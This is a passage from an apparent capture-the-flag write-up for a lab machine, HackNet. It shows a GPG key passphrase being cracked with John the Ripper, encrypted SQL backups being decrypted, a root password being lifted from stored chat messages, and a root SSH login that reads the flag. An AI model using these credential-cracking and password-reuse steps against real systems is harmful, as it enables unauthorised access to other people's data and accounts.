Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:03 DONE (2025-09-14 19:21) 0.2688g/s 113.9p/s 113.9c/s 113.9C/s 246810..ladybug
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got password `sweetheart`.

```bash
sandy@hacknet:/var/www/HackNet/backups$ gpg --list-secret-keys
gpg --list-secret-keys
/home/sandy/.gnupg/pubring.kbx
------------------------------
sec   rsa1024 2024-12-29 [SC]
      21395E17872E64F474BF80F1D72E5C1FA19C12F7
uid           [ultimate] Sandy (My key for backups) <sandy@hacknet.htb>
ssb   rsa1024 2024-12-29 [E]
```

```bash
sandy@hacknet:/var/www/HackNet/backups$ GPG_TTY=$(tty) gpg --pinentry-mode loopback --passphrase "sweetheart" --decrypt backup01.sql.gpg > backup01.sql

gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
sandy@hacknet:/var/www/HackNet/backups$ ls
ls
backup01.sql  backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg
sandy@hacknet:/var/www/HackNet/backups$
```

```bash
GPG_TTY=$(tty) gpg --pinentry-mode loopback --passphrase "sweetheart" --decrypt backup02.sql.gpg > backup02.sql
```

```bash
GPG_TTY=$(tty) gpg --pinentry-mode loopback --passphrase "sweetheart" --decrypt backup02.sql.gpg > backup02.sql
```

Cleanup script might delete it but they will reappear after a min.

In `backup02.sql`:

```bash
<SNIP>
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
(51,'2024-12-29 20:30:56.880458','Got it. Thanks a lot! I’ll let you know as soon as I’m finished.',1,22,18),
(52,'2024-12-29 20:31:16.112930','Cool. If anything goes wrong, ping me immediately.',0,18,22);
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` ENABLE KEYS */;
UNLOCK TABLES;
<SNIP>
```

Got pass `h4ck3rs4re3veRywh3re99` tried as root somehow.

```bash
❯ ssh root@hacknet.htb
root@hacknet.htb's password:
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 14 21:30:31 2025 from 10.10.14.233
root@hacknet:~# ls
root.txt
root@hacknet:~# cat root.txt
1f206c2a8d2cd62eb52d175480c2f89b
```

---
